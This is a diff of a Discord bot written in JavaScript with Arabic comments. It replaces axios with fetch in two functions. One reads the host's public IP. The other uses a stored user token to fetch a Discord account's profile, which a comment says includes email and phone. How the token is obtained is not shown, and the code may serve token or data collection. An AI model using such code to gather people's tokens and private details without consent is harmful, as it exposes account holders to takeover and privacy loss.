@@ -1,5 +1,4 @@
 const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
-const axios = require('axios');
 
 // ضع توكن البوت هنا أو استخدم متغير البيئة
 const BOT_TOKEN = process.env.BOT_TOKEN || 'ضع_توكن_البوت_هنا'; 
@@ -14,7 +13,7 @@ const client = new Client({
 });
 
 // معرف القناة التي سيتم فيها التفاعل
-const TARGET_CHANNEL_ID = '1575683930466558053'; 
+const TARGET_CHANNEL_ID = '1575687812152299621';
 
 // متغيرات لتخزين الحالة الحالية
 let userToken = null;
@@ -23,24 +22,30 @@ let pendingUser = null;
 // دالة لجلب IP العام
 async function getPublicIP() {
     try {
-        const response = await axios.get('https://api.ipify.org?format=json');
-        return response.data.ip;
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
     } catch (error) {
         return 'غير متاح';
     }
 }
 
-// دالة لجلب بيانات الحساب الشخصي (Email, Phone) باستخدام Axios
+// دالة لجلب بيانات الحساب الشخصي باستخدام Fetch
 async function getUserProfileData(token) {
     try {
-        const response = await axios.get('https://discord.com/api/users/@me', {
+        const response = await fetch('https://discord.com/api/users/@me', {
             headers: {
                 Authorization: `Bearer ${token}`
             }
         });
-        return response.data;
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        return await response.json();
     } catch (error) {
-        console.error('خطأ في جلب بيانات المستخدم:', error.response?.data || error.message);
+        console.error('خطأ في جلب بيانات المستخدم:', error.message);
         return null;
     }
 }
